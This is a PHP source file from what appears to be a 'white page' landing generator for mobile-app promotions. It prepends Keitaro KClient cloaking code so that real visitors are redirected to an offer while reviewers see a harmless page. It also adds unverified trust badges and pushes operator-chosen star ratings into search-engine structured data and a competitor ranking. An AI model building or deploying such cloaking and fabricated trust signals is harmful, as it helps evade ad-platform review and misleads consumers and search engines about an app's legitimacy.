<?php
/**
 * builder.php — turn a data array + options into a deployable landing folder.
 */

require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/templates.php';
require_once __DIR__ . '/legal.php';
require_once __DIR__ . '/fetcher.php';

const OUTPUT_DIR = __DIR__ . '/../output';

/**
 * $form keys: name, tagline, description, icon, developer, category, rating,
 *             rating_count, downloads, screenshots[], cta_url, cta_text,
 *             template, lang, accent, kclient(bool), format('php'|'html'),
 *             localize(bool)
 * Returns: ['slug'=>..., 'dir'=>..., 'index'=>filename, 'zip'=>path|null, 'warnings'=>[]]
 */
function build_landing(array $form): array {
    $reg = template_registry();
    $tplKey = $form['template'] ?? 'spotlight';
    if (!isset($reg[$tplKey])) $tplKey = 'spotlight';
    $tpl = $reg[$tplKey];

    $warnings = [];
    $lang     = array_key_exists($form['lang'] ?? 'en', supported_langs()) ? $form['lang'] : 'en';
    $kclient  = !empty($form['kclient']);
    $localize = !isset($form['localize']) || $form['localize'];
    // Kclient is PHP — force .php output when it's on.
    $format   = ($form['format'] ?? 'php') === 'html' ? 'html' : 'php';
    if ($kclient && $format === 'html') {
        $format = 'php';
        $warnings[] = 'Output forced to .php because Kclient integration is enabled (PHP required).';
    }

    $slug = slugify($form['name'] ?? 'app') . '-' . $tplKey;
    $dir  = OUTPUT_DIR . '/' . $slug;
    rrmdir($dir);
    ensure_dir($dir . '/assets');

    // --- Assemble the data array passed to the template ($L) ---
    $L = [
        'name'         => trim($form['name'] ?? 'My App'),
        'tagline'      => trim($form['tagline'] ?? ''),
        'description'  => trim($form['description'] ?? ''),
        'developer'    => trim($form['developer'] ?? ''),
        'category'     => trim($form['category'] ?? 'App'),
        'rating'       => (float)($form['rating'] ?? 4.8),
        'rating_count' => trim($form['rating_count'] ?? ''),
        'downloads'    => trim($form['downloads'] ?? ''),
        'cta_url'      => trim($form['cta_url'] ?? '#download') ?: '#download',
        'cta_text'     => trim($form['cta_text'] ?? ''),
        'lang'         => $lang,
        'dir'          => in_array($lang, rtl_langs(), true) ? 'rtl' : 'ltr',
        'accent'       => preg_match('/^#[0-9a-f]{3,8}$/i', $form['accent'] ?? '') ? $form['accent'] : $tpl['accent'],
        'year'         => date('Y'),
        'icon'         => '',
        'screenshots'  => [],
        'privacy_url'  => 'privacy.html',
        'terms_url'    => 'terms.html',
        'S'            => lpf_strings($lang),
        'reviews'      => fetch_real_reviews(trim($form['source_url'] ?? '')),
    ];
    if ($L['cta_text'] === '') $L['cta_text'] = $L['S']['get'];

    // --- Assets: download locally (default) or hotlink ---
    $iconSrc = trim($form['icon'] ?? '');
    if ($iconSrc !== '') {
        if ($localize) {
            $dest = $dir . '/assets/icon.' . img_ext($iconSrc);
            if (download_file($iconSrc, $dest)) {
                $L['icon'] = 'assets/' . basename($dest);
            } else {
                $L['icon'] = $iconSrc;
                $warnings[] = 'Could not download the app icon — kept the remote URL.';
            }
        } else {
            $L['icon'] = $iconSrc;
        }
    }

    $shots = array_values(array_filter(array_map('trim', (array)($form['screenshots'] ?? []))));
    $i = 1;
    foreach ($shots as $s) {
        if (!preg_match('#^https?://#i', $s) && strpos($s, 'assets/') !== 0) continue;
        if ($localize && preg_match('#^https?://#i', $s)) {
            $dest = $dir . '/assets/shot' . $i . '.' . img_ext($s);
            if (download_file($s, $dest)) {
                $L['screenshots'][] = 'assets/' . basename($dest);
            } else {
                $L['screenshots'][] = $s;
            }
        } else {
            $L['screenshots'][] = $s;
        }
        $i++;
    }
    if (empty($L['screenshots'])) {
        // generate neutral placeholder screens so the layout never breaks
        for ($k = 1; $k <= 3; $k++) {
            $p = $dir . '/assets/shot' . $k . '.svg';
            file_put_contents($p, placeholder_screen($L['name'], $L['accent'], $k));
            $L['screenshots'][] = 'assets/shot' . $k . '.svg';
        }
        $warnings[] = 'No screenshots found — inserted neutral placeholders you can swap out.';
    }
    if ($L['icon'] === '') {
        $p = $dir . '/assets/icon.svg';
        file_put_contents($p, placeholder_icon($L['name'], $L['accent']));
        $L['icon'] = 'assets/icon.svg';
        $warnings[] = 'No icon found — generated a lettermark placeholder.';
    }

    // --- Render the template to HTML ---
    $tplFile = __DIR__ . '/../templates/' . $tpl['file'];
    if (!is_file($tplFile)) {
        $warnings[] = 'Template file missing: ' . $tpl['file'];
        return ['slug' => $slug, 'dir' => $dir, 'index' => null, 'zip' => null, 'warnings' => $warnings];
    }
    ob_start();
    include $tplFile;          // template uses $L
    $html = ob_get_clean();
    $html = apply_enhancements($html, $form, $L);   // SEO overrides + JSON-LD + trust band + cookie banner

    // --- Prepend Kclient include for the preloading method ---
    $indexName = 'index.' . $format;
    if ($kclient) {
        $turl = trim($form['tracker_url'] ?? '');
        $ttok = trim($form['tracker_token'] ?? '');
        if ($turl !== '' && $ttok !== '') {
            $php = kclient_snippet($turl, $ttok);   // full fail-open integration
        } else {
            $php = kclient_include_wrapper();        // fail-open include; user pastes snippet
            $warnings[] = 'Kclient enabled without tracker URL + token — added a fail-open include of kclient.php. Paste your KClient snippet there, or regenerate with the tracker URL/token filled in.';
        }
        $html = $php . $html;
        // drop a harmless placeholder so the page renders before Keitaro's library is added
        file_put_contents($dir . '/kclient.php', kclient_placeholder());
    }

    file_put_contents($dir . '/' . $indexName, $html);
    file_put_contents($dir . '/privacy.html', legal_page('privacy', $L));
    file_put_contents($dir . '/terms.html',   legal_page('terms', $L));
    file_put_contents($dir . '/robots.txt',   "User-agent: *\nAllow: /\n");
    file_put_contents($dir . '/.htaccess',     htaccess_perf());

    // --- Zip it up ---
    $zip = OUTPUT_DIR . '/' . $slug . '.zip';
    @unlink($zip);
    if (!zip_dir($dir, $zip)) {
        $zip = null;
        $warnings[] = 'ZIP extension not available — download the folder from output/ instead.';
    }

    return ['slug' => $slug, 'dir' => $dir, 'index' => $indexName, 'zip' => $zip, 'warnings' => $warnings];
}

/* ------------------------------------------------------------------ */

/** Apache .htaccess: gzip + browser caching for faster loads (no-cache the PHP page). */
function htaccess_perf(): string {
    return <<<HT
# White LP Factory — performance
DirectoryIndex index.php index.html

<IfModule mod_deflate.c>
  AddOutputFilterByType DEFLATE text/html text/plain text/css application/javascript application/json image/svg+xml application/xml
</IfModule>

<IfModule mod_expires.c>
  ExpiresActive On
  ExpiresByType image/jpeg    "access plus 30 days"
  ExpiresByType image/png     "access plus 30 days"
  ExpiresByType image/webp    "access plus 30 days"
  ExpiresByType image/gif     "access plus 30 days"
  ExpiresByType image/svg+xml "access plus 30 days"
  ExpiresByType image/x-icon  "access plus 30 days"
  ExpiresByType text/css      "access plus 7 days"
</IfModule>

<IfModule mod_headers.c>
  <FilesMatch "\\.(jpg|jpeg|png|webp|gif|svg|ico)\$">
    Header set Cache-Control "public, max-age=2592000, immutable"
  </FilesMatch>
  <FilesMatch "\\.php\$">
    Header set Cache-Control "no-store, no-cache, must-revalidate"
  </FilesMatch>
</IfModule>
HT;
}

/**
 * Full fail-open Keitaro snippet, prepended to index.php.
 * kclient.php (next to it) must be Keitaro's KClient LIBRARY (the class file).
 * Real visitors are routed when the tracker is healthy; if it's slow/down/erroring,
 * the error is swallowed and the white page renders.
 */
function kclient_snippet(string $url, string $token): string {
    $u = addslashes($url);
    $t = addslashes($token);
    return <<<PHP
<?php
/* Keitaro cloaking (preloading) — FAIL-OPEN.
   kclient.php (same folder) must be Keitaro's KClient LIBRARY (the class file).
   Tip: for faster failure, lower CURLOPT_TIMEOUT in kclient.php (e.g. 10 -> 4). */
if (file_exists(__DIR__ . '/kclient.php')) {
    require_once __DIR__ . '/kclient.php';
    try {
        ob_start();
        \$client = new KClient('$u', '$t');
        \$client->sendAllParams();
        \$client->forceRedirectOffer();
        \$client->executeAndBreak();          // redirects + exits real visitors; returns otherwise
        if (ob_get_level() > 0) { ob_end_clean(); }   // no redirect -> show white page
    } catch (\\Throwable \$e) {
        if (ob_get_level() > 0) { ob_end_clean(); }   // tracker error/timeout -> show white page
    }
}
?>

PHP;
}

/** Fail-open include used when no tracker URL/token was provided. */
function kclient_include_wrapper(): string {
    return <<<'PHP'
<?php
/* Keitaro preloading — FAIL-OPEN include.
   Put your KClient integration snippet (new KClient(...) ... executeAndBreak()) in
   kclient.php. If it errors or times out, the white page below still renders. */
if (file_exists(__DIR__ . '/kclient.php')) {
    try { ob_start(); include __DIR__ . '/kclient.php'; if (ob_get_level() > 0) { ob_end_clean(); } }
    catch (\Throwable $e) { if (ob_get_level() > 0) { ob_end_clean(); } }
}
?>

PHP;
}

function kclient_placeholder(): string {
    return "<?php\n"
        . "/**\n"
        . " * kclient.php — PLACEHOLDER (no-op so the white page renders before you wire Keitaro).\n"
        . " *\n"
        . " * If you generated WITH a tracker URL + token: replace this with Keitaro's KClient\n"
        . " *   LIBRARY (the big class file) — index.php already contains the fail-open snippet.\n"
        . " * If you generated WITHOUT them: put your KClient snippet here\n"
        . " *   (new KClient('https://tracker/', 'TOKEN'); ...; \$client->executeAndBreak();).\n"
        . " *\n"
        . " * Keitaro: Campaign -> ... -> Integration -> PHP / local. Keep the filename kclient.php.\n"
        . " */\n";
}

/** Neutral lettermark icon (SVG) when none is available. */
function placeholder_icon(string $name, string $accent): string {
    $L = strtoupper(mb_substr(trim($name) ?: 'A', 0, 1));
    return '<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256">'
        . '<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">'
        . '<stop offset="0" stop-color="' . attr($accent) . '"/>'
        . '<stop offset="1" stop-color="#0b0b14"/></linearGradient></defs>'
        . '<rect width="256" height="256" rx="56" fill="url(#g)"/>'
        . '<text x="50%" y="54%" font-family="Arial,Helvetica,sans-serif" font-size="130" font-weight="800" '
        . 'fill="#fff" text-anchor="middle" dominant-baseline="middle">' . esc($L) . '</text></svg>';
}

/** Neutral phone-screen placeholder (SVG). */
function placeholder_screen(string $name, string $accent, int $n): string {
    $tones = ['#0b0b14', '#141422', '#1b1430'];
    $bg = $tones[($n - 1) % 3];
    return '<svg xmlns="http://www.w3.org/2000/svg" width="360" height="780" viewBox="0 0 360 780">'
        . '<rect width="360" height="780" fill="' . $bg . '"/>'
        . '<circle cx="180" cy="150" r="46" fill="' . attr($accent) . '" opacity="0.9"/>'
        . '<rect x="70" y="230" width="220" height="22" rx="11" fill="#ffffff" opacity="0.85"/>'
        . '<rect x="100" y="266" width="160" height="14" rx="7" fill="#ffffff" opacity="0.4"/>'
        . '<rect x="40" y="340" width="280" height="120" rx="18" fill="#ffffff" opacity="0.06"/>'
        . '<rect x="40" y="476" width="280" height="120" rx="18" fill="#ffffff" opacity="0.06"/>'
        . '<rect x="90" y="650" width="180" height="48" rx="24" fill="' . attr($accent) . '"/>'
        . '<text x="180" y="745" font-family="Arial" font-size="15" fill="#ffffff" opacity="0.5" text-anchor="middle">'
        . esc($name) . '</text></svg>';
}

/**
 * Render a template to HTML for the LIVE PREVIEW (no file writes, no downloads).
 * Uses the form's image URLs as-is; inlines SVG placeholders where empty.
 */
function render_preview(array $form): string {
    $reg = template_registry();
    $tplKey = isset($reg[$form['template']]) ? $form['template'] : 'spotlight';
    $tpl = $reg[$tplKey];
    $lang = array_key_exists($form['lang'] ?? 'en', supported_langs()) ? $form['lang'] : 'en';
    $accent = preg_match('/^#[0-9a-f]{3,8}$/i', $form['accent'] ?? '') ? $form['accent'] : $tpl['accent'];

    $icon = trim($form['icon'] ?? '');
    if ($icon === '') {
        $icon = 'data:image/svg+xml;base64,' . base64_encode(placeholder_icon($form['name'] ?? 'App', $accent));
    }
    $shots = array_values(array_filter(array_map('trim', (array)($form['screenshots'] ?? []))));
    if (empty($shots)) {
        for ($k = 1; $k <= 3; $k++) {
            $shots[] = 'data:image/svg+xml;base64,' . base64_encode(placeholder_screen($form['name'] ?? 'App', $accent, $k));
        }
    }

    $L = [
        'name'         => trim($form['name'] ?? 'My App') ?: 'My App',
        'tagline'      => trim($form['tagline'] ?? ''),
        'description'  => trim($form['description'] ?? ''),
        'developer'    => trim($form['developer'] ?? ''),
        'category'     => trim($form['category'] ?? 'App') ?: 'App',
        'rating'       => (float)($form['rating'] ?? 4.8),
        'rating_count' => trim($form['rating_count'] ?? ''),
        'downloads'    => trim($form['downloads'] ?? ''),
        'cta_url'      => '#',
        'cta_text'     => trim($form['cta_text'] ?? ''),
        'lang'         => $lang,
        'dir'          => in_array($lang, rtl_langs(), true) ? 'rtl' : 'ltr',
        'accent'       => $accent,
        'year'         => date('Y'),
        'icon'         => $icon,
        'screenshots'  => $shots,
        'privacy_url'  => '#',
        'terms_url'    => '#',
        'S'            => lpf_strings($lang),
        'reviews'      => fetch_real_reviews(trim($form['source_url'] ?? '')),
    ];
    if ($L['cta_text'] === '') $L['cta_text'] = $L['S']['get'];

    $file = __DIR__ . '/../templates/' . $tpl['file'];
    if (!is_file($file)) return '<p style="font-family:sans-serif;padding:40px">Template not found.</p>';
    ob_start();
    include $file;
    return apply_enhancements(ob_get_clean(), $form, $L);
}

/* ============================================================
 * Trust + SEO enhancements — injected into ANY template's HTML.
 * ============================================================ */

/** JSON-LD SoftwareApplication structured data (legitimacy signal for crawlers). */
function jsonld_app(array $L): string {
    $data = [
        '@context' => 'https://schema.org',
        '@type'    => 'SoftwareApplication',
        'name'     => $L['name'],
        'operatingSystem' => 'Android, iOS',
        'applicationCategory' => ($L['category'] ?: 'MobileApplication'),
        'offers'   => ['@type' => 'Offer', 'price' => '0', 'priceCurrency' => 'USD'],
    ];
    if (!empty($L['rating'])) {
        $rc = (int)preg_replace('/\D/', '', (string)$L['rating_count']);
        $data['aggregateRating'] = ['@type' => 'AggregateRating', 'ratingValue' => (string)$L['rating'], 'bestRating' => '5', 'ratingCount' => (string)max($rc, 1)];
    }
    if (!empty($L['icon']) && strpos($L['icon'], 'data:') !== 0) $data['image'] = $L['icon'];
    if (!empty($L['description'])) $data['description'] = $L['description'];
    if (!empty($L['developer']))  $data['author'] = ['@type' => 'Organization', 'name' => $L['developer']];
    return '<script type="application/ld+json">' . json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>';
}

/** Trust band (badges + 18+/support/copyright). Adapts to the template theme via CSS vars. */
function trust_band(array $L, array $form): string {
    $S = $L['S']; $a = attr($L['accent']);
    $support = trim($form['support_email'] ?? '');
    $company = trim($form['company'] ?? '') ?: $L['name'];
    $age = !empty($form['age18']);
    $items = [['lock', $S['ssl']], ['shield', $S['verified_dev']], ['check', $S['free_safe']]];
    $h  = '<section style="border-top:1px solid var(--line,var(--border,rgba(128,128,128,.18)));padding:30px 22px;text-align:center;font-family:inherit">';
    $h .= '<div style="display:flex;gap:26px;justify-content:center;flex-wrap:wrap;max-width:760px;margin:0 auto 14px">';
    foreach ($items as $it) {
        $h .= '<span style="display:inline-flex;align-items:center;gap:7px;font-size:13.5px;color:var(--text,#222)">'
            . '<span style="color:' . $a . ';display:inline-flex">' . svg_icon($it[0], 18) . '</span>' . esc($it[1]) . '</span>';
    }
    $h .= '</div>';
    if ($age) $h .= '<div style="font-size:12.5px;color:var(--muted,#777);margin-bottom:8px">' . esc($S['age_note']) . '</div>';
    $h .= '<div style="font-size:12.5px;color:var(--muted,#777)">© ' . esc($L['year']) . ' ' . esc($company);
    if ($support !== '') $h .= ' · ' . esc($S['support']) . ': <a href="mailto:' . attr($support) . '" style="color:' . $a . '">' . esc($support) . '</a>';
    $h .= '</div></section>';
    return $h;
}

/** Dismissible cookie-consent banner (floating; works on light or dark pages). */
function cookie_banner(array $L): string {
    $S = $L['S']; $a = attr($L['accent']);
    return '<div id="lpf-ckb" style="position:fixed;left:16px;right:16px;bottom:16px;z-index:99999;max-width:560px;margin:0 auto;'
        . 'background:#15171c;color:#e9edf5;border:1px solid rgba(255,255,255,.12);border-radius:14px;padding:14px 16px;'
        . 'display:flex;gap:14px;align-items:center;justify-content:space-between;box-shadow:0 16px 40px rgba(0,0,0,.4);font-family:system-ui,sans-serif;font-size:13.5px">'
        . '<span>' . esc($S['cookie_text']) . ' <a href="' . attr($L['privacy_url']) . '" style="color:' . $a . '">' . esc($S['privacy']) . '</a></span>'
        . '<button type="button" onclick="var b=document.getElementById(\'lpf-ckb\');if(b)b.remove()" '
        . 'style="background:' . $a . ';color:#06140c;border:0;border-radius:9px;padding:8px 16px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap">' . esc($S['cookie_ok']) . '</button></div>';
}

/** Apply SEO overrides + structured data + trust band + cookie banner to rendered HTML. */
function apply_enhancements(string $html, array $form, array $L): string {
    // --- SEO overrides (only when provided) ---
    $title = trim($form['seo_title'] ?? '');
    $desc  = trim($form['seo_desc'] ?? '');
    $ogimg = trim($form['og_image'] ?? '');
    if ($title !== '') {
        $html = preg_replace('#<title>.*?</title>#is', '<title>' . esc($title) . '</title>', $html, 1);
        $html = preg_replace('#(<meta property="og:title" content=")[^"]*(">)#i', '${1}' . attr($title) . '${2}', $html, 1);
    }
    if ($desc !== '') {
        $html = preg_replace('#(<meta name="description" content=")[^"]*(">)#i', '${1}' . attr($desc) . '${2}', $html, 1);
        $html = preg_replace('#(<meta property="og:description" content=")[^"]*(">)#i', '${1}' . attr($desc) . '${2}', $html, 1);
    }
    if ($ogimg !== '') {
        $html = preg_replace('#(<meta property="og:image" content=")[^"]*(">)#i', '${1}' . attr($ogimg) . '${2}', $html, 1);
    }

    // --- structured data (always) ---
    $html = str_replace('</head>', jsonld_app($L) . "\n</head>", $html);

    // --- comparison section vs. real competitor apps (before footer, else before </body>) ---
    $competitorUrls = preg_split('/\r\n|\r|\n/', trim($form['competitor_urls'] ?? ''));
    $competitors = fetch_competitors(array_filter($competitorUrls));
    $rank = ranking_section($L, $competitors);
    if ($rank !== '') {
        $pos = stripos($html, '<footer');
        $html = ($pos !== false) ? substr($html, 0, $pos) . $rank . substr($html, $pos)
                                 : str_replace('</body>', $rank . '</body>', $html);
    }

    // --- trust band (before footer if present, else before </body>) ---
    if (!empty($form['trust_badges'])) {
        $band = trust_band($L, $form);
        $pos = stripos($html, '<footer');
        $html = ($pos !== false) ? substr($html, 0, $pos) . $band . substr($html, $pos)
                                 : str_replace('</body>', $band . '</body>', $html);
    }

    // --- cookie banner ---
    if (!empty($form['cookie_banner'])) {
        $html = str_replace('</body>', cookie_banner($L) . '</body>', $html);
    }
    return $html;
}

/** "#36d07c" + alpha -> "rgba(54,208,124,.18)" */
function hex2rgba(string $hex, float $alpha): string {
    $hex = ltrim($hex, '#');
    if (strlen($hex) === 3) $hex = $hex[0].$hex[0].$hex[1].$hex[1].$hex[2].$hex[2];
    if (strlen($hex) < 6) return 'rgba(54,208,124,' . $alpha . ')';
    [$r, $g, $b] = [hexdec(substr($hex,0,2)), hexdec(substr($hex,2,2)), hexdec(substr($hex,4,2))];
    return "rgba($r,$g,$b,$alpha)";
}

/**
 * Fetch real metadata (name, icon, rating) for each competitor store link the
 * user pasted in. No invented names or numbers — rows with no fetchable rating
 * are dropped rather than guessed.
 */
function fetch_competitors(array $urls): array {
    $out = [];
    foreach (array_slice($urls, 0, 6) as $url) {
        $url = trim($url);
        if ($url === '' || !preg_match('#^https?://#i', $url)) continue;
        $meta = fetch_app_meta($url);
        // fetch_app_meta() falls back to 'My App' / a placeholder rating when scraping fails —
        // require the explicit "_rating_real" flag so a failed fetch can't masquerade as data.
        if (empty($meta['_rating_real']) || empty($meta['name']) || $meta['name'] === 'My App') continue;
        $out[] = [
            'name' => $meta['name'], 'icon' => $meta['icon'] ?? '',
            'rating' => (float)$meta['rating'], 'source_url' => $url,
        ];
    }
    return $out;
}

/**
 * Comparison section — the generated app plus real competitor apps the user
 * supplied links for. All ratings/names come from the competitors' own store
 * listings (fetched live); nothing here is invented. Sorted by real rating.
 * Returns '' if no competitor data was fetched (no comparison without data).
 */
function ranking_section(array $L, array $competitors): string {
    if (empty($competitors)) return '';
    $S = $L['S']; $a = $L['accent'];

    $rows = [];
    $rows[] = [
        'is_this' => true, 'name' => $L['name'], 'icon' => $L['icon'] ?? '',
        'letter' => mb_substr($L['name'] ?: 'A', 0, 1), 'color' => $a,
        'rating' => (float)$L['rating'], 'url' => null,
    ];
    foreach ($competitors as $c) {
        $rows[] = [
            'is_this' => false, 'name' => $c['name'], 'icon' => $c['icon'],
            'letter' => mb_substr($c['name'], 0, 1), 'color' => '#8b8f98',
            'rating' => $c['rating'], 'url' => $c['source_url'],
        ];
    }
    usort($rows, fn($x, $y) => $y['rating'] <=> $x['rating']);

    $h = '<section style="padding:40px 22px;border-top:1px solid var(--line,var(--border,rgba(128,128,128,.18)))">';
    $h .= '<div style="max-width:560px;margin:0 auto">';
    $h .= '<div style="text-align:center;margin-bottom:22px">';
    $h .= '<h2 style="font-size:clamp(22px,3vw,30px);font-weight:800;letter-spacing:-.02em;margin:6px 0 6px;color:var(--text,#1a1a1a)">' . esc($S['rank_title']) . '</h2>';
    $h .= '<p style="color:var(--muted,#777);font-size:13px;margin:0">' . esc($S['rank_sub']) . '</p>';
    $h .= '</div>';

    $rank = 1;
    foreach ($rows as $r) {
        $box = $r['is_this']
            ? 'background:' . hex2rgba($a, .08) . ';border:1px solid ' . hex2rgba($a, .4)
            : 'border:1px solid var(--line,rgba(128,128,128,.16))';
        $nameHtml = esc($r['name']);
        $h .= '<div style="display:flex;align-items:center;gap:14px;padding:13px 15px;border-radius:14px;margin-bottom:9px;' . $box . '">';
        $h .= '<div style="font-weight:800;font-size:15px;color:' . ($r['is_this'] ? attr($a) : 'var(--muted,#999)') . ';width:20px;text-align:center;flex-shrink:0">' . $rank . '</div>';
        if (!empty($r['icon'])) {
            $h .= '<img src="' . attr($r['icon']) . '" alt="" loading="lazy" style="width:38px;height:38px;border-radius:11px;object-fit:cover;flex-shrink:0">';
        } else {
            $h .= '<div style="width:38px;height:38px;border-radius:11px;display:grid;place-items:center;font-weight:800;font-size:15px;color:#06140c;background:' . attr($r['color']) . ';flex-shrink:0">' . esc($r['letter']) . '</div>';
        }
        $h .= '<div style="flex:1;min-width:0">';
        $h .= '<div style="font-weight:700;font-size:14.5px;color:var(--text,#1a1a1a);display:flex;align-items:center;gap:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">';
        $h .= $r['url'] ? ('<a href="' . attr($r['url']) . '" target="_blank" rel="nofollow noopener" style="color:inherit;text-decoration:none">' . $nameHtml . '</a>') : $nameHtml;
        if ($r['is_this']) {
            $h .= '<span style="font-size:10.5px;font-weight:700;color:' . attr($a) . ';flex-shrink:0">— ' . esc($S['rank_pick']) . '</span>';
        }
        $h .= '</div>';
        $h .= '<div style="font-size:12.5px;color:var(--muted,#888);margin-top:2px">' . esc(number_format($r['rating'], 1)) . ' ★</div>';
        $h .= '</div></div>';
        $rank++;
    }
    $h .= '</div></section>';
    return $h;
}
